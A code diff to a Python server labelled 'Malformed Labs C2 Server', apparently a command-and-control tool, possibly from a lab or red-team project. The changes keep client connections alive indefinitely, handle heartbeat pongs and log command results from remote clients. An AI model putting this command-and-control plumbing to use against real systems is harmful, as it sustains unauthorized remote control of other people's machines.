@@ -20,7 +20,7 @@ SERVER_HOST = '0.0.0.0'
 SERVER_PORT = 8888
 MGMT_HOST = '0.0.0.0'
 MGMT_PORT = 8889
-AUTH_TOKEN = 'malformed_labs_c2_2024'
+AUTH_TOKEN = 'malformed_labs_c2_2025'
 
 # Global variables
 clients = {}
@@ -72,10 +72,23 @@ def handle_client(client_socket, address):
     try:
         print(f"[{datetime.now().strftime('%H:%M:%S')}] 🤝 New client connecting from {address}")
         
+        # Enable socket keep-alive on server side
+        client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
+        
+        # Platform-specific keep-alive settings
+        if hasattr(socket, 'TCP_KEEPIDLE'):
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPIDLE, 60)
+        if hasattr(socket, 'TCP_KEEPINTVL'):
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPINTVL, 10)
+        if hasattr(socket, 'TCP_KEEPCNT'):
+            client_socket.setsockopt(socket.IPPROTO_TCP, socket.TCP_KEEPCNT, 6)
+        
+        print(f"[{datetime.now().strftime('%H:%M:%S')}] 🔧 Keep-alive enabled for {address}")
+        
         # Send handshake
         handshake = {
             'type': 'handshake',
-            'message': 'Malformed Labs C2 Server',
+            'message': 'Malformed Labs C2 Server - Persistent Mode',
             'timestamp': datetime.now().isoformat()
         }
         send_message(client_socket, handshake)
@@ -108,14 +121,20 @@ def handle_client(client_socket, address):
         }
         send_message(client_socket, auth_response)
         
-        # Handle client communication
+        # Handle client communication - maintain connection until shutdown
         while server_running:
             try:
-                client_socket.settimeout(30.0)
+                # Remove timeout - keep connection alive indefinitely
+                client_socket.settimeout(None)
                 message = receive_message(client_socket)
                 
                 if not message:
-                    break
+                    # Only break if we get None and server is shutting down
+                    if not server_running:
+                        break
+                    # Otherwise just continue - client might be idle
+                    time.sleep(1)
+                    continue
                 
                 # Update last seen
                 with client_lock:
@@ -135,11 +154,23 @@ def handle_client(client_socket, address):
                     result = message.get('result', '')
                     print(f"[{datetime.now().strftime('%H:%M:%S')}] 📋 Result from {client_id} ({command}): {result[:100]}{'...' if len(result) > 100 else ''}")
                 
+                elif message.get('type') == 'pong':
+                    # Handle pong responses
+                    print(f"[{datetime.now().strftime('%H:%M:%S')}] 💓 Pong from {client_id}")
+                
             except socket.timeout:
+                # Should never happen now since we removed timeout
                 continue
-            except Exception as e:
-                print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Client {client_id} communication error: {e}")
+            except (ConnectionResetError, ConnectionAbortedError, BrokenPipeError):
+                # Only break on actual connection loss, not temporary issues
+                if server_running:
+                    print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️  Client {client_id} connection lost")
                 break
+            except Exception as e:
+                # Log error but don't disconnect unless it's critical
+                print(f"[{datetime.now().strftime('%H:%M:%S')}] ⚠️  Client {client_id} error (continuing): {e}")
+                time.sleep(1)
+                continue
                 
     except Exception as e:
         print(f"[{datetime.now().strftime('%H:%M:%S')}] ❌ Client handler error: {e}")
